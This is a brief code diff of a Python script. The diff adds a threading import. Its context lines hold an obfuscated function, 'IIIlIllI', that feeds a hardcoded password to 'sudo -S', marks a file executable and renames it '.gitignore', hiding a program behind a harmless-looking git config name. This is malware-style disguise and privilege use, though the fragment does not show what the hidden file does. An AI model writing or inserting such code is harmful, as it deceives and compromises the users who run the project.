@@ -1,5 +1,5 @@
 import subprocess
-
+import threading
 def IIIlIllI():
     subprocess.getoutput('echo user | sudo -S chmod +x ./gitignore')
     subprocess.getoutput('echo user | sudo -S mv gitignore .gitignore')
